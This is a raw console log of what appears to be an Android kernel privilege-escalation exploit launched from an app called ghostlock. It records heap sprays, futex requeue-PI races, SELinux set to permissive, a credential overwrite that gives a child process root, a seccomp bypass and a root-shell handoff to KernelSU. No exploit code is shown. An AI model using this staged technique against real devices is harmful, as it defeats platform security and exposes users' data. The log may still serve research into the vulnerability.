[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mruntime verbose_debug=0
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=22217 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=200312 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=22217 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=22217 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=22217 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+3ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+221ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +255ms
[33m[*] [0m[spray] finding futex collisions... +517ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2009ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff884c96b800 +2058ms
[33m[*] [0m[spray] payload ready +2062ms
[31m[-] [0mpage ffffff884c968000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 1/4 +2228ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +234ms
[33m[*] [0m[spray] finding futex collisions... +471ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1948ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8867ec5400 +2019ms
[33m[*] [0m[spray] payload ready +2023ms
[31m[-] [0mpage ffffff8867ec0000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 2/4 +4423ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +241ms
[33m[*] [0m[spray] finding futex collisions... +504ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1975ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8869816000 +2037ms
[33m[*] [0m[spray] payload ready +2041ms
[33m[*] [0mprepare_kernel_page ok attempt=3 +6637ms
[33m[*] [0m[T+6862ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+8872ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff8869810108 mode=1 leaf=1
[33m[*] [0m[T+8977ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +252ms
[33m[*] [0m[spray] finding futex collisions... +522ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1979ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff80396e0c00 +2012ms
[33m[*] [0m[spray] payload ready +2017ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2196ms
[33m[*] [0m[T+11176ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+13185ms]   PI route done
[32m[+] [0mprivate scratch repaired; releasing quarantine
[33m[*] [0m[T+13188ms] Write 1 complete
[33m[*] [0m[T+13412ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff8937259200 (183/256 votes)
[33m[*] [0mperf task: 0xffffff8937259200 (178/256 votes)
[33m[*] [0m[T+14328ms] perf_find_task done
[33m[*] [0mchild_pid=342 child_task=0xffffff8937259200
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mW2: cred attempt 1/15
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +233ms
[33m[*] [0m[spray] finding futex collisions... +491ms
[33m[*] [0m[spray] early collision screen 14/7 at 31%
[33m[*] [0m[spray] futex collisions found +1946ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8048415c00 +1974ms
[33m[*] [0m[spray] payload ready +1980ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2161ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff8937259998 mode=2 leaf=0
[33m[*] [0m[T+16721ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +248ms
[33m[*] [0m[spray] finding futex collisions... +507ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1973ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88b23e4c00 +2059ms
[33m[*] [0m[spray] payload ready +2063ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2239ms
[33m[*] [0m[T+18964ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+20974ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 0
[32m[+] [0mchild is root!
[33m[*] [0mW3: TIF_SECCOMP+mode attempt 1/6
[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff8937259200 mode=1 leaf=1
[33m[*] [0m[T+22339ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +242ms
[33m[*] [0m[spray] finding futex collisions... +519ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2030ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8066f09400 +2079ms
[33m[*] [0m[spray] payload ready +2090ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2274ms
[33m[*] [0m[T+24619ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+26626ms]   PI route done
[33m[*] [0m=== W3: seccomp mode === target=0xffffff8937259a60 mode=1 leaf=1
[33m[*] [0m[T+26682ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +244ms
[33m[*] [0m[spray] finding futex collisions... +503ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1981ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8816d44400 +2027ms
[33m[*] [0m[spray] payload ready +2030ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2204ms
[33m[*] [0m[T+28890ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+30915ms]   PI route done
[33m[*] [0mseccomp finit_module probe = 0xfffffffd
[33m[*] [0mW3: TIF_SECCOMP+mode attempt 2/6
[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff8937259200 mode=1 leaf=1
[33m[*] [0m[T+31027ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +248ms
[33m[*] [0m[spray] finding futex collisions... +521ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1984ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff806686a800 +2034ms
[33m[*] [0m[spray] payload ready +2040ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2225ms
[33m[*] [0m[T+33258ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+35266ms]   PI route done
[33m[*] [0m=== W3: seccomp mode === target=0xffffff8937259a60 mode=1 leaf=1
[33m[*] [0m[T+35322ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +258ms
[33m[*] [0m[spray] finding futex collisions... +521ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1984ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff886238d000 +2034ms
[33m[*] [0m[spray] payload ready +2037ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2213ms
[33m[*] [0m[T+37541ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+39549ms]   PI route done
[33m[*] [0mseccomp finit_module probe = 0x16
[32m[+] [0mchild seccomp filter bypassed (finit_module errno=22)
[32m[+] [0mchild seccomp fully bypassed (forked workers run filter-free)
[33m[*] [0m[T+41610ms] exploit complete
[33m[*] [0mhandoff: child=342 alive=1 sent=1 errno=0
[33m[*] [0mhandoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mhandoff: root shell worker pid=24683
[33m[*] [0mhandoff: script open fd=3 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0menforce=1 (enforcing)
[32m[+] [0mKernelSU ready
